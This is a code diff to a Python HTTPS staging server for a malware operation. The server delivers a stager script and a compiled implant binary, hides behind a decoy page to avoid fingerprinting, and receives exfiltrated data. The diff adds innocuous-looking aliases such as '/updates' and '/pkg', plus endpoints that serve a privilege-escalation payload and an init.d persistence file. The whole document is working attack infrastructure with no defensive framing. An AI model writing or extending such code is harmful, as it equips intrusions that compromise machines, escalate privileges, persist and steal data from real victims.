@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 HTTPS staging server.
-  GET /s  — serves stager.sh with STAGING_HOST baked in
-  GET /b  — serves the compiled implant binary
+  GET /s  - serves stager.sh with STAGING_HOST baked in
+  GET /b  - serves the compiled implant binary
   all other paths return a generic 200 to avoid fingerprinting
 """
 import datetime
@@ -56,21 +56,25 @@ def _make_tls_context():
     return ctx
 
 
-# Generic response for unknown paths — looks like a plain web server, not a file share
+# Generic response for unknown paths - looks like a plain web server, not a file share
 _DECOY_BODY = b"<html><body><h1>200 OK</h1></body></html>"
 
 
 class _Handler(BaseHTTPRequestHandler):
 
     def log_message(self, fmt, *args):
-        # minimal log — don't print full paths to stdout
+        # minimal log - don't print full paths to stdout
         print("[staging] {0} {1}".format(self.address_string(), args[0] if args else ""))
 
     def do_GET(self):
-        if self.path == "/s":
+        if self.path in ("/s", "/updates"):
             self._serve_stager()
-        elif self.path == "/b":
+        elif self.path in ("/b", "/pkg"):
             self._serve_binary()
+        elif self.path == "/privesc":
+            self._serve_file("privesc", "application/octet-stream")
+        elif self.path == "/initd":
+            self._serve_file("initd", "text/plain")
         else:
             self._serve_decoy()
 
@@ -79,6 +83,16 @@ class _Handler(BaseHTTPRequestHandler):
             self._recv_exfil()
         else:
             self._serve_decoy()
+
+    def _serve_file(self, filename, ctype):
+        path = os.path.join(STAGING_DIR, filename)
+        try:
+            with open(path, "rb") as fh:
+                content = fh.read()
+            self._respond(200, ctype, content)
+        except Exception as exc:
+            print("[staging] file read error ({0}): {1}".format(filename, exc))
+            self._respond(500, "text/plain", b"error")
 
     def _recv_exfil(self):
         try:
